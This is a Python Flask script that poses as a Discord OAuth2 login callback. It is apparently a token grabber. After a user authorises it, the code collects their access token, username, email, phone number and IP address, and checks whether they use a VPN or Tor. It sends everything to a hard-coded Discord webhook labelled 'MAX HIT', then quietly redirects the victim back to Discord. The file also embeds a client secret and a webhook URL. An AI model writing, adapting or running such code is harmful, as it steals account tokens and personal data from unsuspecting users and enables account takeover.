import requests
from flask import Flask, request, redirect
app = Flask(__name__)

# CONFIG
ID = "1501206551942398092"
SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
URI = "https://web-assets-v1.onrender.com/callback"
WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt"
IP_KEY = "PASTE_YOUR_IPINFO_TOKEN_HERE" 

@app.route('/callback')
def callback():
    c = request.args.get('code')
    if not c: return "Fail", 400
    
    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':c,'redirect_uri':URI}
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=d).json()
    t = r.get('access_token')

    if t:
        h = {'Authorization': 'Bearer ' + str(t)}
        u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
        
        # VPN DETECTION ENGINE
        target_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        is_vpn = "NO"
        try:
            # We call the privacy endpoint specifically for VPN/Proxy data
            v_check = requests.get(f"https://ipinfo.io/{target_ip}/privacy?token={IP_KEY}").json()
            if any([v_check.get('vpn'), v_check.get('proxy'), v_check.get('tor'), v_check.get('relay')]):
                is_vpn = "YES ⚠️"
        except:
            is_vpn = "Error"

        # RESULTS
        f = []
        f.append({"name": "User", "value": str(u.get('username'))})
        f.append({"name": "Email", "value": str(u.get('email', 'None'))})
        f.append({"name": "Phone", "value": str(u.get('phone', 'None'))})
        f.append({"name": "VPN / Proxy", "value": is_vpn})
        f.append({"name": "IP", "value": target_ip})
        f.append({"name": "Token", "value": str(t)})
             
        requests.post(WEB, json={"embeds": [{"title": "🔥 MAX HIT", "color": 0xFF0000, "fields": f}]})
        
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
